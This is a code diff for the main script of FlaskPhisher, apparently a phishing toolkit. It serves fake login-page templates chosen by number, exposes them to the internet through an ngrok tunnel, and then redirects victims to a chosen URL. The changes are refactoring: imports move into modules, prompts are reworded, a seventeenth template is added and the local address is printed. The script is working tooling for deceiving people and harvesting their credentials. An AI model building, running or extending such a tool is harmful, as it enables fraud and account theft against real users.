@@ -2,7 +2,6 @@
 from flask import Flask, render_template, request, url_for
 from werkzeug.utils import redirect
 from colorama import Fore
-from pyngrok import ngrok
 import logging
 import sys
 import datetime
@@ -10,20 +9,13 @@ import sqlite3
 # Python Libraries End
 
 # FlaskPhisher Modules
+from Modules.colorConfigs import reset, red, blue, yellow, cyan, green
 from Modules.phishing_template_list import templateList
 from Modules.templatePathChooser import templatePathChooser
-from Modules.banner import banner, notice, banner1
+from Modules.banner import banner, notice, banner1, server_configs
 from Modules.screenCleaner import screenCleaner
+from Modules.ngrokTunnel import ngrokTunnel
 # FlaskPhisher Modules End
-
-# Colors
-red = Fore.RED
-blue = Fore.BLUE
-green = Fore.GREEN
-yellow = Fore.YELLOW
-cyan = Fore.CYAN
-reset = Fore.RESET
-# Colors End
 
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
@@ -73,29 +65,32 @@ if __name__ == "__main__":
     print(green + " Phishing Templates List" + reset)
     print(blue + str(templateList) + reset)
     try:
-        template = input(yellow + "[#] Template Number: " + reset)
+        template = input(yellow + "[#] Template Number >> " + reset)
     except Exception as err:
         print(red + "[-] Error: " + reset + str(err))
     except KeyboardInterrupt:
         print(red + "Keyboard Interrupted!" + reset)
         sys.exit()
 
-    templateNumbers = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16']
+    templateNumbers = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16', '17']
 
     if template in templateNumbers:
         try:
-            port = int(input( yellow + "[#] Port: "  + reset))
-            redirect_addr = str(input(green + "[!] Default Redirect URL is " + reset + red + "'https://google.com'\n" + reset + yellow + "[#] Please enter what site do you want to redirect: "  + reset))
+            screenCleaner()
+            print(red + server_configs + reset)
+            port = int(input( yellow + "[#] Server Port >> "  + reset))
+            redirect_addr = str(input(green + "[!] Default Redirect URL is " + reset + red + "\"https://google.com\"\n" + reset + yellow + "[#] Redirect URL >> "  + reset))
             if redirect_addr == '':
                 redirect_addr = "https://google.com"
             elif redirect_addr == " ":
                 redirect_addr = "https://google.com"
             path = templatePathChooser(number=template)
-            ngrok_url = ngrok.connect(port)
+            ngrok_url = ngrokTunnel(port)
             try:
                 screenCleaner()
                 print(blue + banner1 + reset + "\n")
-                print(green + "[!] " + str(ngrok_url) + reset + "\n")
+                print(green + "[!] Tunnel Connection: " + str(ngrok_url) + reset)
+                print(green + "[!] Local Connection: " + "http://localhost:" + str(port) + reset + "\n")
                 app.run(port=port)
             except Exception as err:
                 print(err)
